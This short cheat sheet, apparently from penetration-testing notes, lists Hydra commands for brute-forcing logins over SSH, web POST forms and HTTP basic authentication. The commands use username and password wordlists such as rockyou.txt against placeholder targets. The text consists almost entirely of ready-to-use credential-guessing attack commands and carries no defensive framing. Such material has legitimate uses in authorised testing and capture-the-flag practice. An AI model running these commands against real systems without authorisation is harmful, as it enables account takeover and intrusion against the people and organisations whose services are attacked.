Add `-F` to stop Hydra on the first match
### SSH

```bash
hydra -L users.txt -P pass.txt x.x.x.x ssh -V
```

Using a username and password file, separated by a `:`

```bash
hydra -C pass.txt x.x.x.x ssh -V
```

### Web-Post-Form

```bash
hydra -l kevin -P /opt/rockyou.txt x.x.x.x {-s xxxx} http{s}-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
```

### Basic HTTP Authentication:

```bash
hydra -l kevin -P /opt/rockyou.txt -s <port> <target> http[s]-get /
```

